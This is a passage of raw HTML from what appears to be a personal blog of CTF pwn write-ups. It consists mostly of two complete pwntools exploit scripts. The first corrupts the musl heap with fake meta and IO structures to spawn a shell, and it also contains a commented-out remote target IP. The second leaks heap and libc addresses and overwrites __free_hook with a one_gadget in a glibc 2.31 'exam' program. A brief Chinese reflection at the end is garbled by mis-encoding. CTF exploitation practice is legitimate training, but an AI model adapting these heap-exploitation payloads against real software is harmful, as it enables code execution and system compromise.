class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh= process([<span class="string">&quot;/home/rootzhang/musl/musl-1.2.2/build/lib/libc.so&quot;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="comment">#sh=remote(&quot;123.60.76.240&quot;,60001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size,name,note_size,note</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;note size: &quot;</span>,<span class="built_in">str</span>(note_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;note content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name_size,name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name_size, name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;name size: &quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forget</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x7ffff7ff0000+0x1679)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;3\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;4\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;4\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;5\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;5\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;6\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">12</span>)</span><br><span class="line">    libc_addr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        libc_addr+=m[(<span class="number">5</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">5</span>-i)+<span class="number">1</span>]</span><br><span class="line">    libc_base=<span class="built_in">int</span>(libc_addr,<span class="number">16</span>)-<span class="number">0xcb0</span>+<span class="number">0x1000</span></span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;8\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;7\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x09\n&#x27;</span>)</span><br><span class="line">    malloc_content=libc_base+<span class="number">0x1aa0</span></span><br><span class="line">    fake_content=p64(libc_base-<span class="number">0x1000</span>+<span class="number">0x50</span>)+p64(malloc_content)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    find(<span class="number">0x40</span>,<span class="string">&#x27;\x00\n&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">    m=sh.recv(<span class="number">16</span>)</span><br><span class="line">    check=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        check+=m[(<span class="number">7</span>-i)*<span class="number">2</span>]+m[<span class="number">2</span>*(<span class="number">7</span>-i)+<span class="number">1</span>]</span><br><span class="line">    check=<span class="built_in">int</span>(check,<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0c\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0b\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0d\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0e\n&#x27;</span>)</span><br><span class="line">    forget()</span><br><span class="line">    fake_mem_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x40</span></span><br><span class="line">    fake_meta_addr=libc_base-<span class="number">0xc000</span>+<span class="number">0x1000</span>+<span class="number">0x10</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>,<span class="number">0x28</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    stdout_addr=libc_base+<span class="number">0x12e0</span></span><br><span class="line">    stderr_addr=libc_base+<span class="number">0x10e0</span></span><br><span class="line">    stdout_use_addr=libc_base+<span class="number">0x1410</span></span><br><span class="line">    execve_addr=libc_base-<span class="number">0x259323</span></span><br><span class="line">    sc = <span class="number">8</span></span><br><span class="line">    freeable = <span class="number">1</span></span><br><span class="line">    last_idx = <span class="number">0</span></span><br><span class="line">    maplen = <span class="number">1</span></span><br><span class="line">    fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr+<span class="number">0x10</span>) <span class="comment"># prev</span></span><br><span class="line">    fake_meta += p64(stdout_use_addr) <span class="comment"># next</span></span><br><span class="line">    fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">    fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">    fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">    fake_meta += p64(<span class="number">0</span>)</span><br><span class="line">    fake_mem=p64(fake_meta_addr)</span><br><span class="line">    fake_mem += p32(<span class="number">1</span>)</span><br><span class="line">    fake_mem += p32(<span class="number">0</span>)</span><br><span class="line">    fake_io=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>+p64(<span class="number">0xdeadbeef</span>) + <span class="string">&#x27;x&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xbeefdead</span>)+p64(execve_addr) + p64(execve_addr)</span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x20</span>)</span><br><span class="line">    payload+=p64(check)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=fake_meta</span><br><span class="line">    payload+=fake_mem</span><br><span class="line">    payload+=fake_io</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x10\n&#x27;</span>,<span class="number">0x2000</span>,payload.ljust(<span class="number">0x2000</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x11\n&#x27;</span>,<span class="number">0x2000</span>,<span class="string">&#x27;\x11\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x0f\n&#x27;</span>)</span><br><span class="line">    fake_content=p64(libc_base+<span class="number">0x48e0</span>+<span class="number">0x10</span>)+p64(fake_mem_addr+<span class="number">0x10</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;\x12\n&#x27;</span>,<span class="number">0x28</span>,fake_content)</span><br><span class="line">    free(<span class="number">0x40</span>,<span class="string">&#x27;\x35\n&#x27;</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;option: &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    <span class="comment"># free(0x40,&#x27;\x10\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x13\n&#x27;,0x80,&#x27;a\n&#x27;)</span></span><br><span class="line">    <span class="comment"># sc = 8</span></span><br><span class="line">    <span class="comment"># last_idx=1</span></span><br><span class="line">    <span class="comment"># payload=&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=&#x27;\x00&#x27;*(0x1000-0x20-0x10)</span></span><br><span class="line">    <span class="comment"># payload+=p64(check)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(fake_meta_addr)+p64(fake_meta_addr)</span></span><br><span class="line">    <span class="comment"># payload+=p64(stdout_addr-0x20-0x20)</span></span><br><span class="line">    <span class="comment"># payload+=p32(1) + p32(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64((sc &lt;&lt; 6) | last_idx)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x14\n&#x27;,0x2000,payload+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># add(0x40,&#x27;\x15\n&#x27;,0x80,&#x27;ssss\n&#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-exam"><a href="#0x3-exam" class="headerlink" title="0x3 exam"></a>0x3 exam</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">num_questions</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter the number of questions:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num_questions))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_sorce</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">i,idx,size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which one? &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;please input the size of comment: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter your comment:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which student id to choose?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">i</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_mode</span>(<span class="params">i,content,score=<span class="number">100</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your mode!\n&quot;</span>)</span><br><span class="line">        sh.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your pray score: 0 to 100\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(score))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your id: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class="line">    m=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nptr_add</span>(<span class="params">nptr</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(nptr))</span><br><span class="line"></span><br><span class="line">duan=<span class="string">&#x27;b *(0x7ffff7fc2000+&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1E45</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x350</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">2</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">4</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    give_sorce()</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    heap_base=get_addr()-<span class="number">0x2a0</span></span><br><span class="line">    nptr_add(heap_base+<span class="number">0x549</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x441</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    free_malloc=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x8f1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0x460</span>)+p64(<span class="number">0x30</span>)+p64(heap_base+<span class="number">0x9e0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0xfffffff700000001</span>)</span><br><span class="line">    pay+=p64(free_malloc)+p64(<span class="number">0x20</span>)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x1a0</span>,pay)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">4</span>,<span class="number">0x20</span>,p64(libc_base+<span class="number">0xe3b31</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-æ€»ç»“"><a href="#0x4-æ€»ç»“" class="headerlink" title="0x4 æ€»ç»“"></a>0x4 æ€»ç»“</h2><p>æ„Ÿè§‰è‡ªå·±æœ‰ç‚¹æµäºå½¢å¼äº†ï¼Œåœ¨çœ‹pwn1çš„æ—¶å€™ä¸€çœ‹åˆ°callocå°±æƒ³ç€æ€ä¹ˆç»•è¿‡ï¼Œå®Œå…¨æ²¡è€ƒè™‘ç¨‹åºæœ¬èº«ï¼Œå“ï¼Œæ‰€ä»¥æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œç°åœ¨çœ‹æ¥æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½è¦ä»¥ç¨‹åºä¸ºæœ¬ï¼Œåˆ‡è®°åˆ‡è®°ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">48</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
